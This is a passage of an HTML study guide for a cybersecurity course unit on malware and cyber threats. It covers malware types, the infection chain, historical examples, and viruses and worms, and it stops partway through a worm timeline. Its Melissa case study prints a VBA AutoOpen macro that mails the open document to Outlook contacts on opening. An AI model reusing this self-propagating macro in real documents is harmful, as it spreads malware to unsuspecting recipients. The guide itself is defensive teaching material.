@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Unit 5: Malware & Cyber Threats — Complete Study Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Share+Tech+Mono&family=Nunito:wght@400;600;700;800&family=Barlow+Condensed:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#0a0408;
+  --bg-card:#120810;
+  --bg-panel:#1a0c16;
+  --red:#ff2244;
+  --red2:#cc1133;
+  --orange:#ff6622;
+  --neon:#ff0066;
+  --acid:#aaff00;
+  --ice:#00ddff;
+  --silver:#c8d0e0;
+  --gold:#ffcc44;
+  --text:#f0e0e8;
+  --dim:#804060;
+  --border:rgba(255,34,68,0.18);
+  --glow:0 0 24px rgba(255,34,68,0.3);
+  --glow-acid:0 0 18px rgba(170,255,0,0.28);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Nunito',sans-serif;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at 20% 20%,rgba(255,34,68,0.07) 0%,transparent 45%),
+             radial-gradient(ellipse at 80% 80%,rgba(170,255,0,0.04) 0%,transparent 45%);
+  pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;
+  background-image:
+    repeating-linear-gradient(0deg,transparent,transparent 49px,rgba(255,34,68,0.03) 50px),
+    repeating-linear-gradient(90deg,transparent,transparent 49px,rgba(255,34,68,0.03) 50px);
+  pointer-events:none;z-index:0;}
+canvas#bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.2;}
+
+/* HEADER */
+header{position:relative;z-index:10;text-align:center;padding:60px 20px 44px;
+  background:linear-gradient(180deg,rgba(10,4,8,0.98) 0%,transparent 100%);
+  border-bottom:1px solid var(--border);}
+.ubadge{display:inline-flex;align-items:center;gap:8px;font-family:'Share Tech Mono',monospace;
+  font-size:.7rem;letter-spacing:4px;text-transform:uppercase;color:var(--red);
+  border:1px solid rgba(255,34,68,0.4);padding:6px 18px;border-radius:2px;margin-bottom:20px;box-shadow:var(--glow);}
+header h1{font-family:'Bebas Neue',sans-serif;font-size:clamp(2.5rem,7vw,5rem);
+  background:linear-gradient(135deg,var(--red) 0%,var(--orange) 35%,var(--gold) 65%,var(--acid) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  line-height:1.05;margin-bottom:8px;letter-spacing:3px;}
+header p.sub{font-family:'Share Tech Mono',monospace;color:var(--dim);font-size:.88rem;letter-spacing:3px;}
+.hstats{display:flex;justify-content:center;gap:20px;margin-top:26px;flex-wrap:wrap;}
+.hs{background:rgba(255,34,68,0.06);border:1px solid var(--border);border-radius:8px;padding:11px 20px;text-align:center;}
+.hs .n{font-family:'Bebas Neue',sans-serif;font-size:1.8rem;color:var(--red);line-height:1;}
+.hs .l{font-size:.68rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:2px;}
+
+/* LAYOUT */
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:5;}
+
+/* TOC */
+.toc-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:8px;margin:14px 0 28px;}
+.ti{display:flex;align-items:center;gap:11px;background:var(--bg-card);border:1px solid var(--border);
+  border-radius:8px;padding:10px 14px;text-decoration:none;color:var(--text);transition:all .3s;cursor:pointer;}
+.ti:hover{border-color:var(--red);background:rgba(255,34,68,0.08);transform:translateX(4px);box-shadow:var(--glow);}
+.tn{font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--orange);min-width:24px;}
+.tt{font-size:.87rem;font-weight:600;}
+
+/* SECTIONS */
+.sec{margin:32px 0;background:var(--bg-card);border:1px solid var(--border);border-radius:16px;overflow:hidden;position:relative;}
+.sec::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--red),var(--acid));}
+.sh{padding:22px 26px 16px 34px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:13px;}
+.sn{font-family:'Share Tech Mono',monospace;font-size:.8rem;color:var(--orange);
+  background:rgba(255,102,34,0.1);border:1px solid rgba(255,102,34,0.28);padding:4px 10px;border-radius:4px;white-space:nowrap;}
+.sh h2{font-family:'Barlow Condensed',sans-serif;font-size:clamp(1.3rem,3vw,2rem);font-weight:800;color:var(--red);letter-spacing:1px;}
+.se{font-size:1.7rem;margin-left:auto;}
+.sb{padding:22px 26px 26px 34px;}
+
+/* SUBSECTIONS */
+.sub{margin-bottom:22px;}
+.sub h3{font-family:'Barlow Condensed',sans-serif;font-size:1.1rem;font-weight:700;color:var(--acid);
+  letter-spacing:.8px;margin-bottom:9px;display:flex;align-items:center;gap:8px;}
+.sub h3::before{content:'▶';color:var(--red);font-size:.7rem;}
+p{line-height:1.72;color:#d0b8c0;margin-bottom:8px;font-size:.95rem;}
+strong{color:var(--gold);font-weight:700;}
+
+/* DEF */
+.def{background:rgba(255,34,68,0.07);border:1px solid rgba(255,34,68,0.25);
+  border-left:3px solid var(--red);border-radius:8px;padding:13px 17px;margin:10px 0;font-size:.93rem;line-height:1.7;}
+.dl{font-family:'Share Tech Mono',monospace;font-size:.66rem;font-weight:700;
+  letter-spacing:3px;color:var(--red);text-transform:uppercase;margin-bottom:5px;}
+
+/* TABLES */
+.tw{overflow-x:auto;margin:12px 0;border-radius:10px;border:1px solid var(--border);}
+table{width:100%;border-collapse:collapse;font-size:.85rem;}
+thead{background:linear-gradient(90deg,rgba(255,34,68,0.15),rgba(170,255,0,0.07));}
+thead th{padding:10px 14px;text-align:left;font-family:'Share Tech Mono',monospace;
+  font-size:.71rem;font-weight:700;letter-spacing:2px;color:var(--acid);
+  text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap;}
+tbody tr{border-bottom:1px solid rgba(255,34,68,0.07);transition:background .2s;}
+tbody tr:hover{background:rgba(255,34,68,0.05);}
+tbody td{padding:9px 14px;color:#d0b8c0;vertical-align:top;line-height:1.5;}
+tbody td:first-child{color:var(--gold);font-weight:700;}
+
+/* CODE */
+.cb{background:#050204;border:1px solid rgba(255,34,68,0.2);border-radius:10px;
+  padding:16px;margin:10px 0;overflow-x:auto;position:relative;}
+.clbl{position:absolute;top:6px;right:10px;font-family:'Share Tech Mono',monospace;
+  font-size:.61rem;letter-spacing:2px;color:var(--red);opacity:.6;text-transform:uppercase;}
+.cb pre{font-family:'Share Tech Mono',monospace;font-size:.78rem;line-height:1.7;color:#d0b8c0;white-space:pre;}
+.cg{color:#aaff00;}.cy{color:#ffcc44;}.co{color:#ff6622;}.ci{color:#00ddff;}
+.cp{color:#ff88cc;}.cr{color:#ff2244;}.cd{color:#50202a;}.cw{color:#f0e0e8;}
+
+/* CARDS */
+.cg2{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:11px;margin:12px 0;}
+.card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;transition:all .3s;}
+.card:hover{border-color:var(--red);transform:translateY(-3px);box-shadow:var(--glow);}
+.ci2{font-size:1.6rem;margin-bottom:7px;}
+.ct{font-family:'Barlow Condensed',sans-serif;font-size:.95rem;font-weight:700;color:var(--acid);margin-bottom:4px;letter-spacing:.5px;}
+.cd2{font-size:.79rem;color:var(--dim);line-height:1.5;}
+
+/* FLOW */
+.flow{margin:12px 0;display:flex;flex-direction:column;align-items:center;}
+.fn{background:rgba(255,34,68,0.08);border:1.5px solid var(--red);border-radius:8px;
+  padding:10px 20px;font-family:'Barlow Condensed',sans-serif;font-size:.93rem;font-weight:700;
+  color:var(--text);text-align:center;min-width:200px;max-width:520px;width:100%;transition:all .3s;letter-spacing:.5px;}
+.fn:hover{background:rgba(255,34,68,0.18);box-shadow:var(--glow);}
+.fn.s{background:rgba(170,255,0,0.08);border-color:var(--acid);border-radius:50px;color:var(--acid);}
+.fn.e{background:rgba(0,221,255,0.08);border-color:var(--ice);border-radius:50px;color:var(--ice);}
+.fn.w{background:rgba(255,102,34,0.09);border-color:var(--orange);color:var(--orange);}
+.fa{display:flex;flex-direction:column;align-items:center;margin:2px 0;}
+.fa .ln{width:2px;height:17px;background:var(--red);opacity:.35;}
+.fa .tip{width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-top:8px solid var(--red);opacity:.35;}
+
+/* HORIZ FLOW */
+.flowh{display:flex;align-items:center;flex-wrap:wrap;justify-content:center;gap:4px;margin:11px 0;}
+.fnh{background:rgba(255,34,68,0.08);border:1px solid var(--red);border-radius:7px;
+  padding:8px 12px;font-size:.78rem;font-weight:700;text-align:center;color:var(--text);
+  font-family:'Barlow Condensed',sans-serif;white-space:nowrap;letter-spacing:.5px;}
+.fah{color:var(--red);font-size:1.1rem;padding:0 3px;opacity:.6;}
+
+/* COMPARE */
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0;}
+.cp2{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;}
+.cp2 h4{font-family:'Barlow Condensed',sans-serif;font-size:.95rem;font-weight:700;
+  margin-bottom:9px;padding-bottom:6px;border-bottom:1px solid var(--border);letter-spacing:.5px;}
+.cp2.r h4{color:var(--red);}
+.cp2.a h4{color:var(--acid);}
+.cp2.o h4{color:var(--orange);}
+.cp2.i h4{color:var(--ice);}
+.cp2.g h4{color:var(--gold);}
+.cp2 ul{list-style:none;padding:0;}
+.cp2 ul li{font-size:.82rem;color:#d0b8c0;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);
+  display:flex;gap:7px;line-height:1.5;}
+.cp2 ul li::before{content:'→';color:var(--dim);flex-shrink:0;}
+
+/* INFO */
+.ib{border-radius:10px;padding:13px 17px;margin:10px 0;display:flex;gap:12px;
+  align-items:flex-start;font-size:.87rem;line-height:1.65;}
+.ib.r{background:rgba(255,34,68,0.08);border:1px solid rgba(255,34,68,0.25);}
+.ib.a{background:rgba(170,255,0,0.07);border:1px solid rgba(170,255,0,0.22);color:#d0f080;}
+.ib.o{background:rgba(255,102,34,0.07);border:1px solid rgba(255,102,34,0.25);color:#ffc090;}
+.ib.i{background:rgba(0,221,255,0.07);border:1px solid rgba(0,221,255,0.22);color:#a0e8ff;}
+.ib.g{background:rgba(255,204,68,0.07);border:1px solid rgba(255,204,68,0.25);color:#ffe090;}
+.bi{font-size:1.2rem;flex-shrink:0;margin-top:2px;}
+
+/* EXERCISE */
+.ex{background:rgba(170,255,0,0.05);border:1px solid rgba(170,255,0,0.22);
+  border-radius:10px;padding:14px 17px;margin:12px 0;}
+.el{font-family:'Share Tech Mono',monospace;font-size:.66rem;font-weight:700;
+  letter-spacing:3px;color:var(--acid);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:7px;}
+.ex ol{padding-left:18px;}
+.ex ol li{font-size:.85rem;color:#d0b8c0;margin-bottom:7px;line-height:1.6;}
+
+/* CONCL */
+.concl{margin-top:20px;background:linear-gradient(135deg,rgba(255,34,68,0.06),rgba(170,255,0,0.04));
+  border:1px solid rgba(255,34,68,0.2);border-radius:10px;padding:14px 18px;}
+.cl{font-family:'Share Tech Mono',monospace;font-size:.66rem;letter-spacing:3px;
+  color:var(--red);text-transform:uppercase;margin-bottom:6px;}
+
+/* SGT */
+.sgt{font-family:'Share Tech Mono',monospace;font-size:.71rem;font-weight:700;letter-spacing:4px;
+  color:var(--dim);text-transform:uppercase;padding:24px 0 10px;display:flex;align-items:center;gap:12px;}
+.sgt::after{content:'';flex:1;height:1px;background:var(--border);}
+.div{height:1px;background:linear-gradient(90deg,transparent,var(--red),transparent);margin:7px 0 20px;opacity:.2;}
+
+/* THREAT LEVEL BADGE */
+.tlvl{display:inline-flex;align-items:center;gap:5px;font-family:'Share Tech Mono',monospace;
+  font-size:.64rem;font-weight:700;padding:3px 10px;border-radius:3px;margin-left:8px;letter-spacing:1px;}
+.tlvl.crit{background:rgba(255,0,102,0.15);color:var(--neon);border:1px solid rgba(255,0,102,0.35);}
+.tlvl.high{background:rgba(255,34,68,0.12);color:var(--red);border:1px solid rgba(255,34,68,0.3);}
+.tlvl.med{background:rgba(255,102,34,0.12);color:var(--orange);border:1px solid rgba(255,102,34,0.3);}
+.tlvl.low{background:rgba(255,204,68,0.1);color:var(--gold);border:1px solid rgba(255,204,68,0.28);}
+
+/* REVISION */
+.rv{display:grid;grid-template-columns:repeat(auto-fill,minmax(265px,1fr));gap:8px;margin:12px 0;}
+.ri{background:var(--bg-panel);border:1px solid var(--border);border-radius:8px;padding:10px 13px;display:flex;gap:10px;}
+.rt{font-family:'Share Tech Mono',monospace;font-size:.7rem;font-weight:700;color:var(--orange);min-width:100px;padding-top:1px;}
+.rd{font-size:.8rem;color:#90606c;line-height:1.5;}
+
+/* PILLS */
+.pills{display:flex;flex-wrap:wrap;gap:7px;margin:11px 0;}
+.pill{font-family:'Barlow Condensed',sans-serif;font-size:.82rem;font-weight:700;padding:4px 13px;
+  border-radius:20px;background:rgba(255,34,68,0.09);border:1px solid rgba(255,34,68,0.22);color:var(--red);letter-spacing:.5px;}
+.pill.a{background:rgba(170,255,0,0.08);border-color:rgba(170,255,0,0.22);color:var(--acid);}
+.pill.o{background:rgba(255,102,34,0.08);border-color:rgba(255,102,34,0.22);color:var(--orange);}
+.pill.i{background:rgba(0,221,255,0.08);border-color:rgba(0,221,255,0.22);color:var(--ice);}
+.pill.g{background:rgba(255,204,68,0.08);border-color:rgba(255,204,68,0.22);color:var(--gold);}
+
+/* MALWARE GRID */
+.mw-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:12px;margin:12px 0;}
+.mw-card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:15px;position:relative;overflow:hidden;transition:all .3s;}
+.mw-card::after{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--red);}
+.mw-card:hover{border-color:var(--red);box-shadow:var(--glow);transform:translateY(-2px);}
+.mw-name{font-family:'Bebas Neue',sans-serif;font-size:1.3rem;color:var(--red);margin-bottom:3px;letter-spacing:1px;}
+.mw-type{font-family:'Share Tech Mono',monospace;font-size:.63rem;letter-spacing:2px;color:var(--acid);margin-bottom:8px;}
+.mw-desc{font-size:.8rem;color:#a08090;line-height:1.55;}
+.mw-stat{display:flex;gap:5px;margin-top:8px;flex-wrap:wrap;}
+
+/* TIMELINE */
+.timeline{position:relative;padding-left:22px;margin:12px 0;}
+.timeline::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:linear-gradient(180deg,var(--red),var(--acid));}
+.tl-item{position:relative;margin-bottom:15px;padding-left:14px;}
+.tl-item::before{content:'';position:absolute;left:-22px;top:8px;width:10px;height:10px;
+  background:var(--red);border-radius:50%;border:2px solid var(--bg);}
+.tl-year{font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--orange);margin-bottom:3px;}
+.tl-title{font-family:'Barlow Condensed',sans-serif;font-weight:700;color:var(--gold);font-size:1rem;margin-bottom:2px;}
+.tl-desc{font-size:.83rem;color:#d0b8c0;line-height:1.55;}
+
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:rgba(255,34,68,.3);border-radius:3px;}
+@media(max-width:640px){.sb,.sh{padding-left:18px;padding-right:14px;}.cmp{grid-template-columns:1fr;}.mw-grid{grid-template-columns:1fr 1fr;}}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+
+<header>
+  <div class="ubadge">☠️ Cybersecurity Course · Unit 5</div>
+  <h1>Malware &amp; Cyber Threats</h1>
+  <p class="sub">// TOPICS 73 — 88 · COMPLETE STUDY GUIDE</p>
+  <div class="hstats">
+    <div class="hs"><div class="n">16</div><div class="l">Topics</div></div>
+    <div class="hs"><div class="n">10+</div><div class="l">Malware Types</div></div>
+    <div class="hs"><div class="n">APT</div><div class="l">Advanced Threats</div></div>
+    <div class="hs"><div class="n">IoC</div><div class="l">Indicators</div></div>
+    <div class="hs"><div class="n">MITRE</div><div class="l">ATT&CK Framework</div></div>
+  </div>
+</header>
+
+<div class="wrap">
+<div class="sgt">📋 Table of Contents</div>
+<div class="toc-g">
+  <a href="#t73" class="ti"><span class="tn">73</span><span class="tt">Introduction to Malware</span></a>
+  <a href="#t74" class="ti"><span class="tn">74</span><span class="tt">Virus</span></a>
+  <a href="#t75" class="ti"><span class="tn">75</span><span class="tt">Worm</span></a>
+  <a href="#t76" class="ti"><span class="tn">76</span><span class="tt">Trojan</span></a>
+  <a href="#t77" class="ti"><span class="tn">77</span><span class="tt">Ransomware</span></a>
+  <a href="#t78" class="ti"><span class="tn">78</span><span class="tt">Spyware</span></a>
+  <a href="#t79" class="ti"><span class="tn">79</span><span class="tt">Adware</span></a>
+  <a href="#t80" class="ti"><span class="tn">80</span><span class="tt">Rootkits</span></a>
+  <a href="#t81" class="ti"><span class="tn">81</span><span class="tt">Botnets</span></a>
+  <a href="#t82" class="ti"><span class="tn">82</span><span class="tt">Keyloggers</span></a>
+  <a href="#t83" class="ti"><span class="tn">83</span><span class="tt">Fileless Malware</span></a>
+  <a href="#t84" class="ti"><span class="tn">84</span><span class="tt">Advanced Persistent Threat (APT)</span></a>
+  <a href="#t85" class="ti"><span class="tn">85</span><span class="tt">Malware Analysis Basics</span></a>
+  <a href="#t86" class="ti"><span class="tn">86</span><span class="tt">Real Attack Examples</span></a>
+  <a href="#t87" class="ti"><span class="tn">87</span><span class="tt">Prevention Techniques</span></a>
+  <a href="#t88" class="ti"><span class="tn">88</span><span class="tt">Unit 5 Revision Notes</span></a>
+</div>
+
+<!-- ===== T73 ===== -->
+<div class="sgt">🦠 Malware Foundations</div>
+<div class="sec" id="t73">
+  <div class="sh"><span class="sn">Topic 73</span><h2>Introduction to Malware</h2><span class="se">☠️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Malware</strong> (malicious software) is any program intentionally designed to disrupt, damage, gain unauthorised access to, or steal data from a computer system. It encompasses all hostile or intrusive software regardless of how it spreads, what it does, or what it targets.
+      </div>
+    </div>
+    <div class="sub"><h3>The Malware Ecosystem</h3>
+      <div class="mw-grid">
+        <div class="mw-card"><div class="mw-name">VIRUS</div><div class="mw-type">SELF-REPLICATING · NEEDS HOST</div><div class="mw-desc">Attaches to legitimate files. Spreads when host file is executed. Can corrupt data.</div><div class="mw-stat"><span class="tlvl high">HIGH</span></div></div>
+        <div class="mw-card"><div class="mw-name">WORM</div><div class="mw-type">SELF-PROPAGATING · NO HOST</div><div class="mw-desc">Spreads autonomously across networks. No user interaction needed. Can consume bandwidth.</div><div class="mw-stat"><span class="tlvl crit">CRITICAL</span></div></div>
+        <div class="mw-card"><div class="mw-name">TROJAN</div><div class="mw-type">DISGUISED · DECEPTION</div><div class="mw-desc">Appears legitimate. Creates backdoor. Steals data or enables remote control.</div><div class="mw-stat"><span class="tlvl high">HIGH</span></div></div>
+        <div class="mw-card"><div class="mw-name">RANSOMWARE</div><div class="mw-type">EXTORTION · ENCRYPTS DATA</div><div class="mw-desc">Encrypts victim's files. Demands ransom for decryption key. Billion-dollar criminal industry.</div><div class="mw-stat"><span class="tlvl crit">CRITICAL</span></div></div>
+        <div class="mw-card"><div class="mw-name">SPYWARE</div><div class="mw-type">SURVEILLANCE · STEALTH</div><div class="mw-desc">Secretly monitors and reports user activity — keystrokes, screenshots, location.</div><div class="mw-stat"><span class="tlvl high">HIGH</span></div></div>
+        <div class="mw-card"><div class="mw-name">ROOTKIT</div><div class="mw-type">PERSISTENCE · STEALTH</div><div class="mw-desc">Hides itself and other malware deep in OS. Survives reboots. Very hard to detect.</div><div class="mw-stat"><span class="tlvl crit">CRITICAL</span></div></div>
+        <div class="mw-card"><div class="mw-name">BOTNET</div><div class="mw-type">NETWORK · C2 CONTROLLED</div><div class="mw-desc">Army of infected devices (bots) controlled by attacker for DDoS, spam, cryptomining.</div><div class="mw-stat"><span class="tlvl crit">CRITICAL</span></div></div>
+        <div class="mw-card"><div class="mw-name">KEYLOGGER</div><div class="mw-type">CREDENTIALS · SURVEILLANCE</div><div class="mw-desc">Records every keystroke. Captures passwords, credit card numbers, messages.</div><div class="mw-stat"><span class="tlvl high">HIGH</span></div></div>
+        <div class="mw-card"><div class="mw-name">FILELESS</div><div class="mw-type">IN-MEMORY · AV EVASION</div><div class="mw-desc">Lives entirely in RAM/registry. No file on disk. Evades most antivirus tools.</div><div class="mw-stat"><span class="tlvl crit">CRITICAL</span></div></div>
+        <div class="mw-card"><div class="mw-name">ADWARE</div><div class="mw-type">REVENUE · ANNOYING</div><div class="mw-desc">Displays unwanted ads. Often bundled with free software. Gateway to worse infections.</div><div class="mw-stat"><span class="tlvl low">LOW</span></div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Malware Infection Chain</h3>
+      <div class="flowh">
+        <div class="fnh" style="border-color:var(--acid);color:var(--acid)">🎯 Initial Access<br/><small style="color:var(--dim)">Phishing, exploit, USB</small></div>
+        <div class="fah">→</div>
+        <div class="fnh">⚙️ Execution<br/><small style="color:var(--dim)">Payload runs</small></div>
+        <div class="fah">→</div>
+        <div class="fnh">🔒 Persistence<br/><small style="color:var(--dim)">Survives reboot</small></div>
+        <div class="fah">→</div>
+        <div class="fnh">📡 C2 Comms<br/><small style="color:var(--dim)">Contacts attacker</small></div>
+        <div class="fah">→</div>
+        <div class="fnh">🔍 Discovery<br/><small style="color:var(--dim)">Maps network</small></div>
+        <div class="fah">→</div>
+        <div class="fnh" style="border-color:var(--red);color:var(--red)">💥 Impact<br/><small style="color:var(--dim)">Data theft / ransom</small></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Malware by Intent</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Intent</th><th>Malware Types</th><th>Goal</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>Financial</td><td>Ransomware, Banking Trojan, Cryptominer</td><td>Direct monetary gain</td><td>WannaCry, Emotet, XMRig</td></tr>
+          <tr><td>Espionage</td><td>Spyware, RAT, APT tools, Keylogger</td><td>Steal secrets, IP, credentials</td><td>Pegasus, Poison Ivy, NetWire</td></tr>
+          <tr><td>Disruption</td><td>Wiper, DDoS botnet, Logic bomb</td><td>Destroy data, cause outages</td><td>NotPetya, Shamoon, Mirai</td></tr>
+          <tr><td>Persistence</td><td>Rootkit, Backdoor, Bootkit</td><td>Maintain long-term access</td><td>Necurs, ZeroAccess, LoJax</td></tr>
+          <tr><td>Propagation</td><td>Virus, Worm</td><td>Spread as widely as possible</td><td>ILOVEYOU, Morris Worm, Code Red</td></tr>
+          <tr><td>Hacktivism</td><td>DDoS tool, Defacement malware</td><td>Political message, embarrassment</td><td>Low Orbit Ion Cannon (LOIC)</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Malware Statistics (2024)</h3>
+      <div class="ib r"><span class="bi">📊</span><div>In 2024: <strong>450,000+ new malware samples detected per day</strong>. Over 1 billion malware programs exist. Ransomware costs businesses over <strong>$20 billion annually</strong>. 94% of malware is delivered via email. The average dwell time (malware undetected in network) is <strong>21 days</strong>. Supply chain attacks increased 742% since 2019.</div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Classify each scenario: (a) software that displays pop-up ads; (b) a program that locks your files and demands Bitcoin; (c) software that logs every key you press; (d) a program that spreads across a network without user interaction.</li>
+      <li>Why is the "dwell time" metric (time malware goes undetected) important for security teams?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Malware is not monolithic — it's a diverse ecosystem of tools serving different criminal purposes. Understanding each type's behaviour, propagation method, and intent is the foundation of defence. A single infected device can compromise an entire organisation if malware is not detected quickly.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T74 ===== -->
+<div class="sec" id="t74">
+  <div class="sh"><span class="sn">Topic 74</span><h2>Virus</h2><span class="tlvl high">HIGH</span><span class="se">🦠</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>computer virus</strong> is a type of malware that <em>attaches itself to a legitimate host file or program</em> and replicates when the infected host is executed. Like a biological virus, it requires a host to spread. It cannot propagate on its own without human action (opening the infected file).
+      </div>
+    </div>
+    <div class="sub"><h3>Types of Viruses</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Virus Type</th><th>Infection Target</th><th>How It Spreads</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>File Infector</td><td>Executable files (.exe, .com)</td><td>Appends/prepends code to legitimate exe; spreads when run</td><td>Jerusalem virus, CIH (Chernobyl)</td></tr>
+          <tr><td>Macro Virus</td><td>Office documents (.doc, .xls, .ppt)</td><td>Embedded in macros; runs when document opened; spreads via email</td><td>Melissa (1999), Concept</td></tr>
+          <tr><td>Boot Sector Virus</td><td>MBR / boot sector of disk</td><td>Infects when infected disk boots; spreads via shared disks</td><td>Stoned, Michelangelo</td></tr>
+          <tr><td>Polymorphic Virus</td><td>Any executable</td><td>Changes own code/signature each time — evades signature AV</td><td>Storm Worm, Simile</td></tr>
+          <tr><td>Metamorphic Virus</td><td>Any executable</td><td>Completely rewrites itself — most advanced AV evasion</td><td>W32/Simile, Zperm</td></tr>
+          <tr><td>Multipartite Virus</td><td>Boot + files simultaneously</td><td>Infects both boot sector AND files — harder to remove</td><td>Ghostball, Tequila</td></tr>
+          <tr><td>Resident Virus</td><td>Memory (RAM)</td><td>Loads into memory, infects any program accessed by OS</td><td>Randex, CMJ</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Virus Lifecycle</h3>
+      <div class="flow">
+        <div class="fn s">Dormant: Virus attached to host file, waiting</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Propagation: User opens infected file → virus copies itself to other files</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Trigger: Condition met (date, counter, event)</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn w">Execution: Payload activates — delete files, encrypt, display message</div>
+      </div>
+    </div>
+    <div class="sub"><h3>Famous Case: Melissa Virus (1999)</h3>
+      <div class="cb"><div class="clbl">MELISSA MACRO VIRUS</div><pre><span class="cy">Type:</span>    Macro virus in Microsoft Word document
+<span class="cy">Vector:</span>  Email attachment "LIST.DOC" — "Important Message from [name]"
+<span class="cy">Payload:</span> Macro automatically emailed infected doc to first 50 Outlook contacts
+
+<span class="cr">Impact:</span>
+  → 1 million computers infected in 3 days
+  → Email servers crashed worldwide (overloaded 300%)
+  → $80 million in damages
+  → Intel, Microsoft, US Marine Corps took email systems offline
+
+<span class="cy">How it worked:</span>
+Sub AutoOpen()
+  ' Opens automatically when document is opened
+  Set app = ActiveDocument.Application
+  Set outlook = app.CreateObject("Outlook.Application")
+  For Each recipient In outlook.AddressLists(1).AddressEntries
+    Set mail = outlook.CreateItem(0)
+    mail.Recipients.Add recipient
+    mail.Subject = "Important Message From " & UserName
+    mail.Body = "Here is that document you asked for"
+    mail.Attachments.Add ActiveDocument.FullName
+    If mail.Recipients.Count = 50 Then Exit For
+    mail.Send
+  Next recipient
+End Sub
+
+<span class="cg">Defence: Disable automatic macro execution in Office settings</span></pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>How does a polymorphic virus evade signature-based antivirus? What type of detection could still catch it?</li>
+      <li>Why do macro viruses thrive in phishing attacks? What Office security setting prevents automatic macro execution?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Viruses were the original malware threat. Today, they remain relevant through macro viruses in Office documents — still a top phishing payload. Defences: disable macros, up-to-date AV, sandboxed email attachment scanning, and user training to never enable macros from unknown sources.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T75 ===== -->
+<div class="sec" id="t75">
+  <div class="sh"><span class="sn">Topic 75</span><h2>Worm</h2><span class="tlvl crit">CRITICAL</span><span class="se">🪱</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        A <strong>worm</strong> is self-replicating malware that spreads across networks <em>without requiring user interaction</em> and <em>without needing a host file</em>. It exploits vulnerabilities in network services, OS, or applications to propagate autonomously. Worms can spread exponentially — infecting millions of devices in hours.
+      </div>
+    </div>
+    <div class="sub"><h3>Worm vs Virus</h3>
+      <div class="cmp">
+        <div class="cp2 r"><h4>🦠 Virus</h4><ul>
+          <li>Requires a host file to attach to</li>
+          <li>Needs user interaction to spread (opening file)</li>
+          <li>Spreads slowly — limited by human action</li>
+          <li>Infects local files primarily</li>
+          <li>Easier to contain (isolate infected files)</li>
+        </ul></div>
+        <div class="cp2 a"><h4>🪱 Worm</h4><ul>
+          <li>Standalone — no host needed</li>
+          <li>Spreads AUTOMATICALLY — no user action</li>
+          <li>Can spread exponentially at network speed</li>
+          <li>Propagates across networks to new machines</li>
+          <li>Harder to contain — requires network isolation</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Famous Worms</h3>
+      <div class="timeline">
+        <div class="tl-item"><div class="tl-year">1988</div><div class="tl-title">Morris Worm — First Major Worm</div><div class="tl-desc">Robert Morris (Cornell student). Exploited Unix sendmail, fingerd, rsh/rexec. Infected ~6,000 machines (10% of internet). First conviction under Computer Fraud and Abuse Act. Caused $100M damage.</div></div>
